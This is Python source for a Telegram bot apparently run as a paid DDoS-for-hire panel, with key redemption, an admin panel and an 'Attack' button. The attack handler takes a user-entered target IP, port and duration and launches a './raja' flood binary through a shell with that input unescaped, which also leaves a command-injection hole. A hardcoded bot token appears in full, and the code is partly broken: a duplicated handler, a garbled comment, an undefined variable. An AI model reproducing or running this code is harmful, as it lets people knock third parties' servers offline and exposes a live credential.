import os
import json
import time
import random
import string
import telebot
import datetime
import calendar
import subprocess
import threading
from telebot import types
from dateutil.relativedelta import relativedelta

# Idef create_random_key()nsert your Telegram bot token here
bot = telebot.TeleBot('7475040161:AAGm_HQNuFGbCnhuDQsu048raX2LJHqPd6o')

# Admin user IDs
admin_id = {"7479349647"}

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
string_variable = "some text"  # ✅ Correct
record_command_logs = "some text"


# In-memory storage
users = {}
keys = {}
last_attack_time = {}

# Load data from files
def load_data():
    global users, keys
    users = read_users()
    keys = read_keys()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def create_random_key():
    key = "FLASH-" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
    keys[key] = {"status": "valid"}
    save_keys()
    return key

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def clear_logs():
    try:
        with open(LOG_FILE, "w") as file:
            file.truncate(0)
        return "Logs cleared ✅"
    except FileNotFoundError:
        return "No data found."

@bot.message_handler(func=lambda message: message.text == "🎟️ Redeem Key")
def redeem_key(message):
    bot.reply_to(message, "🔑 Please enter your key:")
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    key = message.text.strip()
    if key in keys and keys[key]["status"] == "valid":
        keys[key]["status"] = "redeemed"
        save_keys()
        users[str(message.chat.id)] = (datetime.datetime.now() + relativedelta(days=1)).strftime('%Y-%m-%d %H:%M:%S')
        save_users()
        bot.reply_to(message, "✅ Key Redeemed Successfully! You now have access.")
    else:
        bot.reply_to(message, "📛 Invalid or Expired Key 📛")


# Users Command
@bot.message_handler(func=lambda message: message.text == "📜 Users")
def list_users(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔ Access Denied: Admins only.")
        return
    if not users:
        bot.reply_to(message, "⚠ No users found.")
        return
    response = "✅ *Registered Users* ✅\n\n" + "\n".join([f"🆔 {user}" for user in users])
    bot.reply_to(message, response, parse_mode='Markdown')

# Logs Command
@bot.message_handler(func=lambda message: message.text == "📜 Logs")
def show_logs(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔ Access Denied: Admins only.")
        return
    if not os.path.exists(LOG_FILE) or os.stat(LOG_FILE).st_size == 0:
        bot.reply_to(message, "⚠ No logs available.")
        return
    with open(LOG_FILE, "r") as file:
        logs = file.readlines()[-10:]
    bot.reply_to(message, "📜 *Recent Logs:*\n\n" + "".join(logs), parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text == "🎟️ Redeem Key")
def process_redeem_key(message):
    key = message.text.strip()
    if key in keys and keys[key]["status"] == "valid":
        keys[key]["status"] = "redeemed"
        save_keys()
        
        expiration_date = (datetime.datetime.now() + relativedelta(days=1)).strftime('%Y-%m-%d %H:%M:%S')
        users[str(message.chat.id)] = expiration_date
        save_users()
        
        bot.reply_to(message, "✅ Key Redeemed Successfully! You now have access.")
    else:
        bot.reply_to(message, "📛 Invalid or Expired Key 📛")

@bot.message_handler(commands=['start'])
def start_command(message):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    attack_button = types.KeyboardButton("🚀 Attack")
    myinfo_button = types.KeyboardButton("👤 My Info")
    redeem_button = types.KeyboardButton("🎟️ Redeem Key")
    admin_panel_button = types.KeyboardButton("🔧 ADMIN_PANEL")
    if str(message.chat.id) in admin_id:
        markup.add(admin_panel_button)
    markup.add(attack_button, myinfo_button, redeem_button)
    bot.reply_to(message, "𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝔽Ｌ人ꇙᕼ_x_ꪜ𝗜Ҏ 𝗩𝗜𝗣 𝗗𝗗𝗢𝗦!", reply_markup=markup)
@bot.message_handler(func=lambda message: message.text == "🔧 ADMIN_PANEL")
def admin_panel(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔ Access Denied: Admins only.")
        return

    admin_markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    users_button = types.KeyboardButton("📜 Users")
    gen_key_button = types.KeyboardButton("🔑 GenKey")
    logs_button = types.KeyboardButton("📜 Logs")
    remove_user_button = types.KeyboardButton("REMOVE USER")  # ✅ NEW BUTTON
    back_button = types.KeyboardButton("⬅ Back")

    admin_markup.add(users_button, gen_key_button, logs_button, remove_user_button, back_button)
    bot.reply_to(message, "🔧 *Admin Panel Opened* 🔧\nSelect an option:", reply_markup=admin_markup, parse_mode="Markdown")

# ✅ New handler for removing users
@bot.message_handler(func=lambda message: message.text == "REMOVE USER")
def remove_user_prompt(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔ Access Denied: Admins only.")
        return

    bot.reply_to(message, "🗑️ Enter the User ID you want to remove:")
    bot.register_next_step_handler(message, process_remove_user)

def process_remove_user(message):
    user_id = str(message.text.strip())

    if user_id in users:
        del users[user_id]
        save_users()
        bot.reply_to(message, f"✅ User {user_id} has been removed successfully!")
    else:
        bot.reply_to(message, "⚠️ User ID not found in the system.")

# Back Button Command
@bot.message_handler(func=lambda message: message.text == "⬅ Back")
def back_to_main_menu(message):
    start_command(message)  # Calls the start function again to reset the menu

# GenKey Command with Inline Buttons
@bot.message_handler(func=lambda message: message.text == "🔑 GenKey")
def genkey_command(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "⛔ Access Denied: Admins only.")
        return
    markup = types.InlineKeyboardMarkup(row_width=2)
    durations = ["1hour", "5hours", "1day", "3days", "7days"]
    for duration in durations:
        markup.add(types.InlineKeyboardButton(text=duration, callback_data=f"genkey_{duration}"))
    bot.reply_to(message, "🔑 *Select Key Duration:*", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("genkey_"))
def process_genkey(call):
    user_id = str(call.message.chat.id)
    duration = call.data.split("_")[1]
    if user_id not in admin_id:
        bot.answer_callback_query(call.id, "⛔ Access Denied.")
        return
    key = create_random_key()
    bot.send_message(call.message.chat.id, f"✅ *Generated Key:* `{key}`\n⏳ Duration: {duration}", parse_mode="Markdown")

COOLDOWN_PERIOD = 60  # 1-minute cooldown

@bot.message_handler(func=lambda message: message.text == "🚀 Attack")
def handle_attack(message):
    user_id = str(message.chat.id)

    if user_id in users and users[user_id]:  # Ensure user has valid expiration
        try:
            expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
        except ValueError:
            bot.reply_to(message, "⚠️ Error: Invalid date format. Contact Admin.")
            return

        if datetime.datetime.now() > expiration:
            bot.reply_to(message, "❗ Your access has expired. Contact the admin to renew ❗")
            return

        # Check if cooldown period has passed
        if user_id in last_attack_time:
            time_since_last_attack = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
            if time_since_last_attack < COOLDOWN_PERIOD:
                remaining_cooldown = COOLDOWN_PERIOD - time_since_last_attack
                response = f"⌛️ 𝗖𝗼𝗼𝗹𝗱𝗼𝘄𝗻 𝗶𝗻 𝗲𝗳𝗳𝗲𝗰𝘁 𝘄𝗮𝗶𝘁 {int(remaining_cooldown)} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀"
                bot.reply_to(message, response)
                return  # Prevent the attack from proceeding

        # Prompt the user for attack details
        response = "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝗽, 𝗽𝗼𝗿𝘁 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲"
        bot.reply_to(message, response)
        bot.register_next_step_handler(message, process_attack_details)

    else:
        response = "⛔️ 𝗨𝗻𝗮𝘂𝘁𝗼𝗿𝗶𝘀𝗲𝗱 𝗔𝗰𝗰𝗲𝘀𝘀! ⛔️\n\n OWNER :- @TF_FLASH92 !"
        bot.reply_to(message, response)
def process_attack_details(message):
    user_id = str(message.chat.id)
    details = message.text.split()

    if len(details) == 3:
        target = details[0]
        try:
            port = int(details[1])
            time = int(details[2])
            if time > 240:
                response = "❗️𝗘𝗿𝗿𝗼𝗿: 𝘂𝘀𝗲 𝗹𝗲𝘀𝘀𝘁𝗵𝗲𝗻 240 𝘀𝗲𝗰𝗼𝗻𝗱𝘀❗️"
            else:
                # Log the attack instead of calling `string_variable`
                log_command(user_id, target, port, time)
                full_command = f"./raja {target} {port} {time} 500"
                username = message.chat.username or "No username"

                response = f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target}:{port}\n𝗧𝗶𝗺𝗲: {time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀\n𝗔𝘁𝘁𝗮𝗰𝗸𝗲𝗿: @{username}"

                subprocess.Popen(full_command, shell=True)
                threading.Timer(time, send_attack_finished_message, [message.chat.id, target, port, time]).start()

                last_attack_time[user_id] = datetime.datetime.now()

        except ValueError:
            response = "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗽𝗼𝗿𝘁 𝗼𝗿 𝘁𝗶𝗺𝗲 𝗳𝗼𝗿𝗺𝗮𝘁."
    else:
        response = "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗳𝗼𝗿𝗺𝗮𝘁"
        
    bot.reply_to(message, response)

def send_attack_finished_message(chat_id, target, port, time):
    """Notify the user that the attack is finished."""
    message = f"🚀 Attack completed! ✅"
    bot.send_message(chat_id, message)
    
@bot.message_handler(func=lambda message: message.text == "👤 My Info")
def my_info(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"

    # Determine the user's role and additional information
    if user_id in admin_id:
        role = "Admin"
        key_expiration = "No access"
        balance = "Not Applicable"  # Admins don’t have balances
    elif user_id in resellers:
        role = "Reseller"
        balance = resellers.get(user_id, 0)
        key_expiration = "No access"  # Resellers may not have key-based access
    elif user_id in users:
        role = "User"
        key_expiration = users[user_id]  # Fetch expiration directly
        balance = "Not Applicable"  # Regular users don’t have balances
    else:
        role = "Guest"
        key_expiration = "No active key"
        balance = "Not Applicable"

    # Format the response
    response = (
        f"👤 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 👤\n\n"
        f"ℹ️ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username}\n"
        f"🆔 𝗨𝘀𝗲𝗿𝗜𝗗: {user_id}\n"
        f"🚹 𝗥𝗼𝗹𝗲: {role}\n"
        f"🕘 𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: {key_expiration}\n"
    )

    bot.reply_to(message, response)
    
@bot.message_handler(commands=['users'])
def list_authorized_users(message):
    user_id = str(message.chat.id)

    # Ensure only admins can use this command
    if user_id not in admin_id:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")
        return

    if users:
        response = "✅ 𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗨𝘀𝗲𝗿𝘀 ✅\n\n"
        for user, expiration in users.items():
            expiration_date = datetime.datetime.strptime(expiration, '%Y-%m-%d %H:%M:%S')
            formatted_expiration = expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            
            # Fetch user info to get either username or first name
            user_info = bot.get_chat(user)
            username = user_info.username if user_info.username else user_info.first_name
            
            response += f"• 𝗨𝘀𝗲𝗿 𝗜𝗗: {user}\n  𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲: @{username}\n  𝗘𝘅𝗽𝗶𝗿𝗲𝘀 𝗢𝗻: {formatted_expiration}\n\n"
    else:
        response = "⚠️ 𝗡𝗼 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝘂𝘀𝗲𝗿𝘀 𝗳𝗼𝘂𝗻𝗱."

    bot.reply_to(message, response, parse_mode='Markdown')
    
if __name__ == "__main__":
    load_data()
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(e)
            # Add a small delay to avoid rapid looping in case of persistent errors
        time.sleep(1)